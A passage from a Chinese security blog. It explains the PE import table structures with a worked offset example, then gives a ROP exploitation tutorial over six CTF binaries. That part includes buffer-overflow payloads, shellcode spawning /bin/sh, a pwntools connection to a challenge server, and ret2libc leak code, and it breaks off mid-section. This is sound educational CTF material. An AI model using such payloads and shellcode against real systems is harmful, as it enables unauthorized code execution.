      <a class="article-title" href="/2018/11/21/PE--导入导出表/">PE 导入导出表</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近在看《黑卡免杀攻防》，对讲解的PE文件导入表、导出表的作用与原理有了更深刻的理解，特此记录。<br>首先，要知道什么是导入表？<br>导入表机制是PE文件从其他第三方程序（一般是DLL动态链接库）中导入API，以提供本程序调用的机制。而在Windows平台下，PE文件中的导入表结构就承担了完成这一工作的引导者角色。</p>
<p>IMAGE_IMPORT_DESCRIPTOR结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD   Characteristics;            // 0 for terminating null import descriptor</span><br><span class="line">        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  // 0 if not bound,</span><br><span class="line">                                            // -1 if bound, and real date\time stamp</span><br><span class="line">                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br><span class="line">                                            // O.W. date/time stamp of DLL bound to (Old BIND)</span><br><span class="line"> </span><br><span class="line">    DWORD   ForwarderChain;                 // -1 if no forwarders</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line">typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>一般来说，对于导入表，我们只需要关注它的两个字段，分别是OriginalFirstThunk与FirstThunk,这两个字段分别指向了包含导出名称和导出地址的IMAGE_THUNK_DATA结构数组，这个数组以空的IMAGE_THUNK_DATA结构结尾。</p>
<p>IMAGE_THUNK_DATA结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">typedef struct _IMAGE_THUNK_DATA32 &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        PBYTE ForwarderString;      // 转发字符串的RAV</span><br><span class="line">        PDWORD Function;             // 被导入函数的地址</span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME AddressOfData;        // 指向输入名称表</span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line">typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>ForwarderString是转发用的，暂时不用考虑，Function表示函数地址，如果是按序号导入Ordinal就有用了，若是按名字导入AddressOfData便指向名字信息。可以看出这个结构体就是一个大的union，大家都知道union虽包含多个域但是在不同时刻代表不同的意义那到底应该是名字还是序号，该如何区分呢？可以通过Ordinal判断，如果Ordinal的最高位是1，就是按序号导入的，这时候，低16位就是导入序号，如果最高位是0，则AddressOfData是一个RVA，指向一个IMAGE_IMPORT_BY_NAME结构，用来保存名字信息，由于Ordinal和AddressOfData实际上是同一个内存空间，所以AddressOfData其实只有低31位可以表示RVA，但是一个PE文件不可能超过2G，所以最高位永远为0，这样设计很合理的利用了空间。实际编写代码的时候微软提供两个宏定义处理序号导入：IMAGE_SNAP_BY_ORDINAL判断是否按序号导入，IMAGE_ORDINAL用来获取导入序号。</p>
<p>了解一下IMAGE_IMPORT_BY_NAME结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_THUNK_DATA32 &#123;</span><br><span class="line">    	union &#123; </span><br><span class="line">		PBYTE ForwarderString;</span><br><span class="line">            	PDWORD Function;</span><br><span class="line">            	DWORD Ordinal;</span><br><span class="line">            	PIMAGE_IMPORT_BY_NAME AddressOfData;</span><br><span class="line">         &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Hint: 保存着需要导入函数的序号<br>Name: 保存着需要导入函数的名称</p>
<p>知道了基本的组成，那么导入表又是怎样尽职尽责的工作呢？<br>记录一个实例流程。</p>
<p>借助LordPE工具，快速定位导入表的位置。</p>
<p><img src="C:\WINDOWS\TEMP\1541779029041.png" alt="1541779029041"></p>
<p>Importtable的RVA地址是0x0000233C；那么它的文件OFFSET是多少？<br>首先查看各个段的RVA和OFFSET：</p>
<p><img src="https://img-blog.csdn.net/20181007134000155?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nhb2JvX2xxNjY2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 显然,Importtable在.rdata区段<br>.rdata区段的RVA为0x2000,.rdata区段的起始Offset是0x00001000<br>RVA到Offset的转化：<br>导出表Offset = 导出表RVA - 导出表所在区段的RVA + 导出表所在区段的 Offset<br>求得导出表Offset = 0x0000133c<br>导出表地址计算参照值 d = 导出表RVA - 导出表Offset = 0x00001000    (便于计算各个字段的Offset)</p>
<p>得到Offset就可以在winhex里面找到importtable的内容了：</p>
<p><img src="https://img-blog.csdn.net/20181007135217790?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nhb2JvX2xxNjY2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdn.net/20181007142703859?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nhb2JvX2xxNjY2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdn.net/20181007142740377?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nhb2JvX2xxNjY2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 由于是以空的结构体结尾的，很清楚的看到是有三个IMAGE_IMPORT_DESCRIPTOR结构：<br>TABLE1：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>OriginalFirstThunk</th>
<th>TimeDataStamp</th>
<th>ForwarderChain</th>
<th>Name</th>
<th>FirstThunk</th>
</tr>
</thead>
<tbody>
<tr>
<td>值(RVA)</td>
<td>0x0000238c</td>
<td>0x00000000</td>
<td>0x00000000</td>
<td>0x000023dc</td>
<td>0x00002000</td>
</tr>
<tr>
<td>转化为Offset</td>
<td>0x0000138c</td>
<td></td>
<td></td>
<td>0x000013dc</td>
<td>0x00001000</td>
</tr>
</tbody>
</table>
<p>TABLE2：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>OriginalFirstThunk</th>
<th>TimeDataStamp</th>
<th>ForwarderChain</th>
<th>Name</th>
<th>FirstThunk</th>
</tr>
</thead>
<tbody>
<tr>
<td>值(RVA)</td>
<td>0x00002450</td>
<td>0x00000000</td>
<td>0x00000000</td>
<td>0x000024f8</td>
<td>0x000020c4</td>
</tr>
<tr>
<td>转化为Offset</td>
<td>0x00001450</td>
<td></td>
<td></td>
<td>0x000013dc</td>
<td>0x000010c4</td>
</tr>
</tbody>
</table>
<p>TABLE3：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>OriginalFirstThunk</th>
<th>TimeDataStamp</th>
<th>ForwarderChain</th>
<th>Name</th>
<th>FirstThunk</th>
</tr>
</thead>
<tbody>
<tr>
<td>值(RVA)</td>
<td>0x000023cc</td>
<td>0x00000000</td>
<td>0x00000000</td>
<td>0x0000252e</td>
<td>0x00002040</td>
</tr>
<tr>
<td>转化为Offset</td>
<td>0x000013cc</td>
<td></td>
<td></td>
<td>0x0000152e</td>
<td>0x00001040</td>
</tr>
</tbody>
</table>
<p>由这些信息（INT、IAT、映像名的起始Offset）;就可以找它们的具体结构了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">映像名、INT、IAT</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>NAME</th>
<th>OriginalFirstThunk1</th>
<th>OriginalFirstThunk2</th>
<th></th>
<th>FirstThunk1</th>
<th>FirstThunk2</th>
</tr>
</thead>
<tbody>
<tr>
<td>KERNEL32.dll</td>
<td>0x00002458</td>
<td>0x00002466</td>
<td></td>
<td>0x00002458</td>
<td>0x00002466</td>
</tr>
<tr>
<td>USER32.dll</td>
<td>0x000024ea</td>
<td>NULL</td>
<td></td>
<td>0x000024ea</td>
<td>NULL</td>
</tr>
<tr>
<td>MSVCR110.dll</td>
<td>0x00002558</td>
<td>0x00002568</td>
<td></td>
<td>0x00002558</td>
<td>0x00002568</td>
</tr>
</tbody>
</table>
<p> 根据上述的导入信息，转化为Offset；再从文件中找到导入函数和倒入序号：</p>
<table>
<thead>
<tr>
<th>NAME</th>
<th>序号1</th>
<th>函数名1</th>
<th></th>
<th>序号2</th>
<th>函数名2</th>
</tr>
</thead>
<tbody>
<tr>
<td>KERNEL32.dll</td>
<td>0x016d</td>
<td>ExitProcess</td>
<td></td>
<td>0x0223</td>
<td>GetCurrentProcess</td>
</tr>
<tr>
<td>USER32.dll</td>
<td>0X010a</td>
<td>FindWindowW</td>
<td></td>
<td>NULL</td>
<td>NULL</td>
</tr>
<tr>
<td>MSVCR110.dll</td>
<td>0x01a4</td>
<td>__getmainorgs</td>
<td></td>
<td>0x01e0</td>
<td>__set_app_type</td>
</tr>
</tbody>
</table>
<p> 总结：</p>
<p>导入表的工作原理步骤：</p>
<p>1、根据IMANE_IMPORT_DESCRIPTOR的字段（NAME,OriginalFirstThunk,FirstThunk），来找到映像名、INT、IAT；</p>
<p>2、根据INT表的信息(OriginalFirstThunk字段)，找到_IMAGE_IMPORT_BY_NAME结构的位置，从而得出函数的函数名、函数序号。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/PE--导入导出表/" data-id="cjorg7gsw000jt0tvuoq8dl83" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-ROP专项总结" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/ROP专项总结/" class="article-date">
  <time datetime="2018-11-20T16:19:50.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/ROP专项总结/">ROP专项总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一、What is ROP</p>
<p>ROP的全称为Return-oriented<br>programming(返回导向编程)，这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御(比如内存不可执行和代码签名等)。虽然现在大家都在用64位的操作系统，但是想要扎实学好ROP还是得从基础的x86系统开始。在随后的教程中我们还会带来linux_x64以及android(arm)方面的ROP利用方法，欢迎大家继续学习。</p>
<p>二、实战演示</p>
<p>1、ROP_LEV1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h][bp-80h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段程序很明显是有漏洞的,buf缓冲区大小0x88 &lt; 0x200（read）。</p>
<p>典型的缓冲区溢出，接下来就是怎么利用的问题了。会发现居然有一个callsystem函数：</p>
<p><img src="F:\kaliwork\CTF\CSU\Pwn\r1ida3.png" alt=""></p>
<p>显然，我们只需要把ret地址覆盖为callsystem函数的地址就OK。</p>
<p>构造的payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callsysadr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(callsysadr)</span><br></pre></td></tr></table></figure>
<p>可以发现，这个pwn很简单。能够直接利用程序现有的system函数调用，只需要简单的引导程序流程就好。接下来会有所不同。</p>
<p>2、ROP_LEV2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);            <span class="comment">// 输出buf的地址</span></span><br><span class="line">                                                <span class="comment">// 可以recvline得到地址作为shellcode首地址</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);                 <span class="comment">// 溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样是read函数导致的缓冲区溢出问题，不同的是程序并没有提供供我们调用的类似于callsystem的函数。</p>
<p>这个时候就需要我们自己去写shellcode(当然如果对shellcode的字节数没有太高的要求的话，比如这个题目，用pwntools提供的shellcraft就OK)。问题的关键在于，我们怎么引导程序执行我们提供的shellcode，显然，需要用shellcode的首地址来覆盖ret。OK，那么shellcode的首地址在哪？如何得知？</p>
<p>嘿，这个时候就是考验C语言功底的了，%p岂不就是输出地址，也就是说程序为我们提供了buf缓冲区的首地址。这不就是为我们的shellcode做嫁衣……，何不直接把shellcode写在buf首地址处，再用它覆盖ret。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'202.197.58.168'</span>,<span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">shell_adr = p.recvline()[<span class="number">12</span>:<span class="number">-2</span>]				<span class="comment">#buf_addr</span></span><br><span class="line">shell_adr = int(adr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x04</span> - len(shellcode)) + p32(shell_adr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>怎么样？这个是不是就有点意思啦。</p>
<p>别急，未完继续……</p>
<p>3、ROP_LEV3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);                <span class="comment">// 有system函数调用</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);                 <span class="comment">// 溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析一下，有溢出、有system函数可以使用，那么字符串’/bin/sh’有没有呢？</p>
<p><img src="F:\kaliwork\CTF\CSU\Pwn\r3ida3.png" alt=""></p>
<p>（当然得有，不然怎么展示……）</p>
<p>比起ROP_LEV1,你会发现，这个更“委婉”，它为我们准备了system函数，也准备了”/bin/sh”串。但就是不会主动执行。</p>
<p>那我们的目标就很明确了，想办法把这两个”联系“起来，i386(32bit)的函数调用，参数与函数有什么联系？当然是栈的分布。</p>
<p><img src="C:\WINDOWS\TEMP\1542076673595.png" alt="1542076673595"></p>
<p>传递payload的想要的效果就像是上面展示的一样，2到3的转化其实就是我们用一个函数（system)地址覆盖RET后，执行的以下指令:    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>
<p>这时候，熟悉函数调用的栈帧结构就知道 [ebp+8]就是system函数的参数，换句话说，我们需要把”/bin/sh”放在M的位置。</p>
<p>在结束函数执行的结尾，执行以下指令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
<p>这时候，执行pop ebp过后；esp就指向了W的位置，也就是说W处就是执行system函数的返回地址。</p>
<p>鉴于以上，构造的payload就是这样的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./rop_lev3'</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x0804a024</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0x12345612</span>) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
<p>这个题目，比较基础（但很重要），尤其是可以巩固加强对栈帧的建立和清除的过程的理解与掌握。</p>
<p>4、ROP_LEV4</p>
<p>先放图吧</p>
<p><img src="C:\WINDOWS\TEMP\1542078081480.png" alt="1542078081480"></p>
<p><img src="C:\WINDOWS\TEMP\1542078103453.png" alt="1542078103453"></p>
<p><img src="C:\WINDOWS\TEMP\1542078206534.png" alt="1542078206534"></p>
<pre><code>咦，怎么和上一个神相似……

没错，是很像，不同的是ROP4是x64，ROP3是x86。两者是有很大不同的。

linux_64与linux_86的区别主要有两点：**首先是内存地址的范围由32位变成了64位**。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。**其次是函数参数的传递方式发生了改变**，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。

对此，我们需要在程序中寻找诸如“pop rdi; ret”这样的代码片段（gadget），先引导程序执行代码片段，将输入在栈中的参数弹到寄存器中，再引导程序执行system()函数。推荐工具：ROPgadget。

找到&quot;pop rdi;ret&quot;代码段后，就OK了，直接构造payload。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">pop_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_addr = <span class="number">0x600a90</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(pop_ret_addr) + p64(bin_addr) + p64(systemaddr)</span><br></pre></td></tr></table></figure>
<p>5、ROP_LEV5</p>
<p><img src="C:\WINDOWS\TEMP\1542078946549.png" alt="1542078946549"></p>
<pre><code>这里的fgets读取了50个byte到s缓冲区，而s缓冲区的大小只有0x20个。（强烈暗示存在可利用的溢出）
</code></pre><p>问题是怎么利用，一般的想法，是把ret覆盖为一个函数，但是这题是找不到system，”/bin/sh”的。有没有想到ROP_LEV2的自己构造shellcode。</p>
<pre><code>没错，这个也需要shellcode，可是这个的shellcode很有讲究。

首先，我们不知道s缓冲区的首地址，无法直接用这个地址来覆盖ret。

我们可以想办法把shellcode放在ret后面的区域，利用这样一个细节：在函数返回的时候， esp恰好指向栈帧中返回地址的后一个位置。这个时候可能会想，能不能把shellcode放在esp的位置，把ret覆盖为指令&quot;jmp esp;&quot;的地址就可以了。这个想法没错，但是要考虑一点，长度。比如，这道题fgets进了50个byte，我们需要(0x20 + 0x04)byte的垃圾填充，只剩余14个byte用来做shellcode的空间（目前我找不到，也写不出这样短的）。而且来说，这样做还会有一个坏处，就是不能够修复寄存器的值，使得函数正常地返回继续执行原程序。

放在s缓冲区？可以想办法把esp指向s的首地址（在这题指令： sub esp, 0x20 + 0x08就能做到)
</code></pre><p>再执行指令”jmp esp;”就可以把程序流程EIP引导至s首地址处。</p>
<pre><code>构造payload之前，想办法把sub esp, 0x28转化成机器码&quot;83EC28FFE4&quot;，用OD就可以。

至于shellcode，在网上能找到很多（我找到的是一个24字节的）；payload如下
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">"\x31\xc9"</span></span><br><span class="line">shellcode += <span class="string">"\xf7\xe1"</span></span><br><span class="line">shellcode += <span class="string">"\x51"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x2f\x2f\x73\x68"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x2f\x62\x69\x6e"</span></span><br><span class="line">shellcode += <span class="string">"\x89\xe3"</span></span><br><span class="line">shellcode += <span class="string">"\xb0\x0b"</span></span><br><span class="line">shellcode += <span class="string">"\xcd\x80"</span></span><br><span class="line">jmp_addr = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode + <span class="string">'a'</span> * (<span class="number">0x24</span> - len(shellcode)) </span><br><span class="line">payload += p32(jmp_addr) + <span class="string">"\x83\xec\x28\xff\xe4"</span></span><br></pre></td></tr></table></figure>
<pre><code>6、ROP_LEV6

看图
</code></pre><p><img src="C:\WINDOWS\TEMP\1542081640188.png" alt="1542081640188"></p>
<pre><code>本题我们来练习x86下ret2libc利用方法。system()函数和&quot;/bin/sh&quot;字符串都不能从程序段中找到了。而libc.so里面存放有system()函数的实现，以及&quot;/bin/sh&quot;字符串，该文件会在程序执行时动态链接进内存。我们需要想办法获得system()函数和&quot;/bin/sh&quot;字符串的地址，由于开启了地址随机化，我们需要计算出libc在内存中的基址。一种常见的办法是，先引导程序到某一输出函数，从而泄露出某个库函数在GOT表中存放的该函数在内存中的实际地址，以确定libc的版本号，再根据偏移不变原理，依据“基址+偏移=实际地址”公式计算出libc基址。从而就可以得到system()函数和&quot;/bin/sh&quot;字符串的地址。推荐工具：libc-database + LibcSearcher或DynELF

采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。一个简单的leak(address)实现模板如下：
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'a'</span>*(padding_len) + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<pre><code>采用libc-database + LibcSesrcher时，需要准备libc-database，LibcSearcher，在github上面有很多。

用这个，我们同样需要leak一个函数地址；例如利用write函数leak一个地址，一般选择函数&quot;__libc_start_main&quot;:
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(main) + p32(<span class="number">1</span>) + p32(libc_start_main) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">libc_start_main_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br></pre></td></tr></table></figure>
<pre><code>之后再用LibcSearcher(leak_funname, leak_addr)来查询匹配的libc版本，可能会有很多备选，这时候可以多leak几个函数的地址，用add_condition（leak_funname,leak_addr)来增强匹配的准确性。像这样：
